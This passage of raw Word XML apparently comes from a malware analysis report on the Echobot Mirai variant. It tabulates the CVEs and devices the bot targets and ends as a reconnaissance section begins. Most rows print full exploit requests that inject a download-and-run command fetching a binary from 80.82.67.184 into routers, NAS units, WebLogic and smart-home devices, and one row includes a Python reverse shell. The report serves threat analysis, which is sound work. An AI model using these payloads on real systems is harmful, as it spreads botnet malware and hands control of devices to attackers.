            </w:pPr>
            <w:r>
              <w:t>Function names analyzed in ghidra as non-stripped binary:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C4B028B" w14:textId="6E192273" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>blackboxScan, blackbox_scanner_kill, blackbox_setup_connection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4D43369E" w14:textId="320A19FF" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00BA717C">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="00264CE7">
              <w:t>Crestron AM/Barco wePresent WiPG/Extron ShareLink/Teq AV IT/SHARP PN-L703WA/Optoma WPS-Pro/Blackbox HD WPS/InFocus LiteShow</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> devices</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="5E0A5914" w14:textId="26931EF2" w:rsidTr="008C77A4">
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="2269" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4D676E03" w14:textId="7419825E" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r>
              <w:t>CVE</w:t>
            </w:r>
            <w:r w:rsidRPr="002930BC">
              <w:t>-2017-14135</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1B59C5EA" w14:textId="01C9FA77" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00974947">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Function names analyzed in ghidra as non-stripped binary: dreamboxscan, dreambox_scanner_kill, dreambox_setup_connection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7516F1B1" w14:textId="693C2FD7" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>OpenDreambox devices such as CCTV systems and video recorders</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="7D489EDC" w14:textId="0C4313F5"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E1AE0E2" w14:textId="17629C25" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r>
              <w:t>CVE</w:t>
            </w:r>
            <w:r w:rsidRPr="00D20D25">
              <w:t>_2018_6961</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="69B8E82C" w14:textId="77777777" w:rsidR="008C77A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rsidRPr="002B3291">
              <w:t>POST /scripts/ajaxPortal.lua HTTP/1.1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18B9D443" w14:textId="77777777" w:rsidR="008C77A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t>Function names analyzed in ghidra as non-stripped binary:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A76091E" w14:textId="556A7B8A" w:rsidR="008C77A4" w:rsidRPr="00A1225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t>vmwarescan, vmscan_scanner_kill, vmware_setup_connection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="04614CD7" w14:textId="1523989B"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273CB4">
              <w:t>VMware NSX SD-WAN Edge &lt; 3.1.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="54BD813F" w14:textId="23CD7560" w:rsidTr="008C77A4">
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="2269" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5B63D5A9" w14:textId="7A663EEC" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r>
              <w:t>CVE</w:t>
            </w:r>
            <w:r w:rsidRPr="00D20D25">
              <w:t>_2018_7841</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="070B3A05" w14:textId="5018651B"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F54C3C">
              <w:t>POST /smartdomuspad/modules/reporting/track_import_export.php HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1C1CB03B" w14:textId="2CF156B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5C397F">
              <w:t>Schneider Electric U.Motion Builder 1.3.4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="6F5DD0AC" w14:textId="13A17E6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3687395" w14:textId="4FFD9253" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r>
              <w:t>CVE</w:t>
            </w:r>
            <w:r w:rsidRPr="00D20D25">
              <w:t>_2018_11510_11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="63CA9FB5" w14:textId="7080AAC3"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2C7D">
              <w:t>POST /portal/apis/aggrecate_js.cgi?script=launcher%22%26python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%</w:t>
            </w:r>
            <w:r w:rsidRPr="005A2C7D">
              <w:lastRenderedPageBreak/>
              <w:t>2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B%27%22 HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="357C283D" w14:textId="345B40A8"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2C7D">
              <w:lastRenderedPageBreak/>
              <w:t>ASUSTOR ADM 3.1.0.RFQ3 NAS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="2BE49359" w14:textId="772083AC" w:rsidTr="008C77A4">
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="2269" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="39A9F273" w14:textId="7A208588" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r>
              <w:t>CVE</w:t>
            </w:r>
            <w:r w:rsidRPr="00D20D25">
              <w:t>_2018_17173</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="36B3D44E" w14:textId="6058913F"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C70821">
              <w:t>GET /qsrserver/device/getThumbnail?sourceUri=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="009773D8">
              <w:t>wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard -O /tmp/f; chmod 777 /tmp/f; /tmp/f; &gt;/tmp/f ;&amp;targetUri=/tmp/thumb/test.jpg&amp;mediaType=image&amp;targetWidth=400&amp;targetHeight=400&amp;scaleType=crop&amp;=1537275717150 HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="356863AF" w14:textId="29D50E82"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49246B">
              <w:t>LG SuperSign CMS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="1DD12F61" w14:textId="00C4F058"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C17D84F" w14:textId="7D62FF10" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r>
              <w:t>CVE</w:t>
            </w:r>
            <w:r w:rsidRPr="00D20D25">
              <w:t>_2019_2725</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="40B977E5" w14:textId="77777777" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00CE20B1">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="2160"/>
              </w:tabs>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="00F00DA1">
              <w:t>POST /_async/AsyncResponseServiceHttps HTTP/1.1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="417AC480" w14:textId="7F55AF78" w:rsidR="008C77A4" w:rsidRPr="00CE20B1" w:rsidRDefault="008C77A4" w:rsidP="00CE20B1">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="2160"/>
              </w:tabs>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Function names analyzed in ghidra as non-stripped binary: oraclescan, oraclescan_scanner_kill, oraclescan_setup_connection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1E450330" w14:textId="3E417CFE" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00CE20B1">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="003D5E6F">
              <w:t xml:space="preserve">Oracle WebLogic </w:t>
            </w:r>
            <w:r w:rsidRPr="00F2286D">
              <w:t>10.3.6.0.0 / 12.1.3.0.0</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="003D5E6F">
              <w:t>Server</w:t>
            </w:r>
            <w:r>
              <w:t>s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="7E2B7C84" w14:textId="58980A26" w:rsidTr="008C77A4">
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="2269" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3033D7F1" w14:textId="3863BF76" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r>
              <w:t>ASUS</w:t>
            </w:r>
            <w:r w:rsidRPr="00D20D25">
              <w:t>_</w:t>
            </w:r>
            <w:r>
              <w:t>DSL</w:t>
            </w:r>
            <w:r w:rsidRPr="00D20D25">
              <w:t>_</w:t>
            </w:r>
            <w:r>
              <w:t>N</w:t>
            </w:r>
            <w:r w:rsidRPr="00D20D25">
              <w:t>12</w:t>
            </w:r>
            <w:r>
              <w:t>E</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="44975F30" w14:textId="1E7F7823" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00293DF7">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="00B43432">
              <w:t>GET /Main_Analysis_Content.asp?current_page=Main_Analysis_Content.asp&amp;next_page=Main_Analysis_Content.asp&amp;next_host=www.target.com&amp;group_id=&amp;modified=0&amp;action_mode=+Refresh+&amp;action_script=&amp;action_wait=&amp;first_time=&amp;applyFlag=1&amp;preferred_lang=EN&amp;firmver=1.1.2.3_345-g987b580&amp;cmdMethod=ping&amp;destIP=%60ucd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard%60&amp;pingCNT=5 HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5BCA449C" w14:textId="7647A4AB" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Asus DSL N12E Router</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="30EDF0E1" w14:textId="79B6ECE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9E337A2" w14:textId="6DB11F98" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r>
              <w:t>BELKIN_WEMO_RCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2DA4A804" w14:textId="1E1D90C9" w:rsidR="008C77A4" w:rsidRDefault="008C77A4"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POST /upnp/control/basicevent1 HTTP/1.1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55E0ECEC" w14:textId="46B87671" w:rsidR="008C77A4" w:rsidRDefault="008C77A4"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&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt; &lt;s:Body&gt;&lt;u:SetSmartDevInfo xmlns:u="urn:Belkin:service:basicevent:1"&gt; &lt;SmartDevURL&gt;cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard -O /tmp/ECHOBOT; chmod +x /tmp/ECHOBOT; /tmp/ECHOBOT&lt;/SmartDevURL&gt; &lt;/u:SetSmartDevInfo&gt; &lt;/s:Body&gt; &lt;/s:Envelope&gt;"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="79AC8BF9" w14:textId="6A9645DF" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Belkin/Wemo smart devices</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="7D8036E8" w14:textId="6B82D919" w:rsidTr="008C77A4">
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="2269" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="11EB343C" w14:textId="60FF0F3A" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r>
              <w:t>CVE</w:t>
            </w:r>
            <w:r w:rsidRPr="00D20D25">
              <w:t>_2013_4863</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2D784BB9" w14:textId="72B26291"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51594">
              <w:t>POST /upnp/control/hag HTTP/1.1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3095CA57" w14:textId="75CF1BB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AB1DBA">
              <w:t>&lt;s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;s:Body&gt; &lt;u:RunLua xmlns:u="urn:schemas-micasaverde-org:service:HomeAutomationGateway:1"&gt; &lt;DeviceNum&gt;&lt;/DeviceNum&gt; &lt;Code&gt;os.execute(cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard)&lt;/Code&gt; &lt;/u:RunLua&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="15CF87D9" w14:textId="4E143E3E"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AB3D0D">
              <w:t>MiCasaVerde VeraLite 1.5.408</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="1CF18968" w14:textId="559B5BBC"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40302AD" w14:textId="4AFE0B9C" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r>
              <w:t>NETGEAR_READYNAS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="65D0F91C" w14:textId="51A375FE" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00A9385C">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>GET /upgrade_handle.php?cmd=writeuploaddir&amp;uploaddir=%27;cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard%205;%27 HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="441B1536" w14:textId="266DFD14" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Netgear ReadyNAS surveillance devices</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="1DC8447A" w14:textId="665D4D7C" w:rsidTr="008C77A4">
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="2269" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="28F1EF16" w14:textId="4A259465" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r>
              <w:t>CVE</w:t>
            </w:r>
            <w:r w:rsidRPr="00D20D25">
              <w:t>_2014_8361</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7AD9C57B" w14:textId="77777777"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33C1A">
              <w:t>POST /wanipcn.xml HTTP/1.1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65E5039B" w14:textId="37C693D5"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96CE3">
              <w:lastRenderedPageBreak/>
              <w:t>&lt;?xml version="1.0"?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;&lt;SOAP-ENV:Body&gt;&lt;m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"&gt;&lt;NewPortMappingDescription&gt;&lt;/NewPortMappingDescription&gt;&lt;NewLeaseDuration&gt;&lt;/NewLeaseDuration&gt;&lt;NewInternalClient&gt;cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard&lt;/NewInternalClient&gt;&lt;NewEnabled&gt;1&lt;/NewEnabled&gt;&lt;NewExternalPort&gt;634&lt;/NewExternalPort&gt;&lt;NewRemoteHost&gt;&lt;/NewRemoteHost&gt;&lt;NewProtocol&gt;TCP&lt;/NewProtocol&gt;&lt;NewInternalPort&gt;45&lt;/NewInternalPort&gt;&lt;/m:AddPortMapping&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="24727CA5" w14:textId="10022B6B" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:lastRenderedPageBreak/>
              <w:t>Realtek SDK</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1A44627F" w14:textId="5BD61666" w:rsidR="00F71DCF" w:rsidRDefault="00EB146F" w:rsidP="00F71DCF">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc101284335"/>
      <w:r>
        <w:t>System Reconnaisance</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA5BE25" w14:textId="5447899C" w:rsidR="00FD7B86" w:rsidRDefault="00FC35E2" w:rsidP="00190AD4">
      <w:r>
        <w:t>As many IoT Devices use different hardware such as ARM, MIPS o</w:t>
      </w:r>
      <w:r w:rsidR="006E1DAF">
        <w:t xml:space="preserve">r SPARCE, the Echobot </w:t>
      </w:r>
      <w:r w:rsidR="00A2725B">
        <w:t>M</w:t>
      </w:r>
      <w:r w:rsidR="006E1DAF">
        <w:t>irai variant tries to gather information on</w:t>
      </w:r>
      <w:r w:rsidR="00D434BD">
        <w:t xml:space="preserve"> these </w:t>
      </w:r>
      <w:r w:rsidR="001A4B98">
        <w:t>Linux</w:t>
      </w:r>
      <w:r w:rsidR="006E1DAF">
        <w:t xml:space="preserve"> devices before infecting them. </w:t>
      </w:r>
      <w:r w:rsidR="00EA6816">
        <w:t xml:space="preserve">This malware sample uses </w:t>
      </w:r>
      <w:r w:rsidR="005F3A16">
        <w:t>multiple shell commands</w:t>
      </w:r>
      <w:r w:rsidR="001361AE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EA6816">
        <w:t>for s</w:t>
      </w:r>
      <w:r w:rsidR="001361AE">
        <w:t xml:space="preserve">ystem scanning </w:t>
      </w:r>
      <w:r w:rsidR="005F3A16">
        <w:t>before trying to maintain persistence.</w:t>
      </w:r>
      <w:r w:rsidR="004951C8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AAC89E1" w14:textId="51F90391" w:rsidR="001361AE" w:rsidRPr="0009673E" w:rsidRDefault="004951C8" w:rsidP="00190AD4">
      <w:r>
        <w:t>Some</w:t>
      </w:r>
      <w:r w:rsidR="003A5E89">
        <w:t xml:space="preserve"> shell</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> commands we noticed were</w:t>
      </w:r>
      <w:r w:rsidR="00FD7B86">
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="003A5E89">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">whoami, cat, </w:t>
      </w:r>
      <w:r w:rsidR="004B39D7" w:rsidRPr="003A5E89">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ls,</w:t>
      </w:r>
      <w:r w:rsidR="004E2A31">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> rm, </w:t>
      </w:r>
      <w:r w:rsidR="00940E54">
        <w:rPr>
          <w:b/>
